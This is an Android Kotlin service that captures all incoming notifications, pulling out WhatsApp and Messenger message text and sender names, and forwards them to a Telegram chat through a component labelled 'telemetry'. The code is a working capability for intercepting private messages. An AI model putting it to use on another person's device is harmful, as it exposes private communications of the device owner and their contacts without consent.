package com.example.service

import android.app.Notification
import android.content.ComponentName
import android.os.Build
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import com.example.data.AppDatabase
import com.example.data.DataStoreManager
import com.example.data.TelemetryRepository
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.first
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.*

class NotificationForwarderService : NotificationListenerService() {

    private val serviceScope = CoroutineScope(Dispatchers.IO)
    private lateinit var repository: TelemetryRepository
    private lateinit var dataStoreManager: DataStoreManager

    override fun onCreate() {
        super.onCreate()
        val db = AppDatabase.getDatabase(this)
        dataStoreManager = DataStoreManager(this)
        repository = TelemetryRepository(this, db.appDao(), dataStoreManager)
    }

    override fun onListenerConnected() {
        super.onListenerConnected()
        serviceScope.launch {
            try {
                repository.log("NotificationForwarder", "Notification Listener Service Connected successfully.", "INFO")
            } catch (e: Exception) {
                // Ignore
            }
        }
    }

    override fun onListenerDisconnected() {
        super.onListenerDisconnected()
        serviceScope.launch {
            try {
                repository.log("NotificationForwarder", "Notification Listener Service Disconnected.", "WARN")
            } catch (e: Exception) {
                // Ignore
            }
        }
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        super.onNotificationPosted(sbn)
        if (sbn == null) return

        val pack = sbn.packageName

        // PREVENT INFINITE LOOP: Ignore notifications from Chirkut and Telegram apps
        if (pack == packageName || 
            pack == "org.telegram.messenger" || 
            pack == "org.thunderdog.challegram" || 
            pack == "com.telegram.messenger") {
            return
        }

        serviceScope.launch {
            try {
                val enabled = dataStoreManager.notificationForward.first()
                if (!enabled) return@launch

                val extras = sbn.notification.extras
                val title = extras.getString(Notification.EXTRA_TITLE) ?: ""
                var text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""
                val bigText = extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString() ?: ""
                val subText = extras.getCharSequence(Notification.EXTRA_SUB_TEXT)?.toString() ?: ""
                val summary = extras.getCharSequence(Notification.EXTRA_SUMMARY_TEXT)?.toString() ?: ""

                var sender = title
                var finalMessage = if (bigText.isNotBlank()) bigText else text

                // Intercept WhatsApp and Messenger MessagingStyle
                val isMessagingStyle = extras.getString(Notification.EXTRA_TEMPLATE) == "android.app.Notification\$MessagingStyle" || 
                                       extras.getString(Notification.EXTRA_TEMPLATE) == "androidx.core.app.NotificationCompat\$MessagingStyle"
                
                if (isMessagingStyle) {
                    val conversationTitle = extras.getCharSequence(Notification.EXTRA_CONVERSATION_TITLE)?.toString()
                    val messages = extras.getParcelableArray(Notification.EXTRA_MESSAGES) as? Array<android.os.Parcelable>
                    
                    if (!messages.isNullOrEmpty()) {
                        val lastMessageBundle = messages.last() as? android.os.Bundle
                        if (lastMessageBundle != null) {
                            val msgText = lastMessageBundle.getCharSequence("text")?.toString()
                            
                            var senderName: String? = null
                            val senderPerson = lastMessageBundle.getParcelable("sender_person") as? android.app.Person
                            if (senderPerson != null) {
                                senderName = senderPerson.name?.toString()
                            }
                            if (senderName == null) {
                                senderName = lastMessageBundle.getCharSequence("sender")?.toString()
                            }
                            
                            if (msgText != null) {
                                finalMessage = msgText
                            }
                            if (senderName != null) {
                                sender = senderName
                            }
                        }
                    }
                    
                    if (conversationTitle != null && conversationTitle.isNotBlank()) {
                        sender = "$sender (Group: $conversationTitle)"
                    }
                }

                val pm = applicationContext.packageManager
                val appName = try {
                    val ai = pm.getApplicationInfo(pack, 0)
                    pm.getApplicationLabel(ai).toString()
                } catch (e: Exception) {
                    pack
                }

                // Skip blank notifications
                if (sender.isBlank() && finalMessage.isBlank()) return@launch

                val timestamp = sbn.postTime
                val timeStr = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date(timestamp))
                
                // Detailed text to comply with "Capture extra"
                val extraText = buildString {
                    if (subText.isNotBlank()) append("\n*Subtext:* $subText")
                    if (summary.isNotBlank()) append("\n*Summary:* $summary")
                    if (sbn.notification.category != null) append("\n*Category:* ${sbn.notification.category}")
                    if (sbn.notification.channelId != null) append("\n*Channel:* ${sbn.notification.channelId}")
                }

                val message = """
                    📱 *New Notification*
                    *Application:* $appName
                    *Sender/Title:* $sender
                    *Message:* $finalMessage$extraText
                    *Time:* $timeStr
                    *Package:* $pack
                """.trimIndent()

                repository.log("NotificationForwarder", "Captured notification from $appName", "INFO")
                repository.sendTelegramMessage(message)
            } catch (e: Exception) {
                repository.log("NotificationForwarder", "Error forwarding notification: ${e.message}", "ERROR")
            }
        }
    }
}
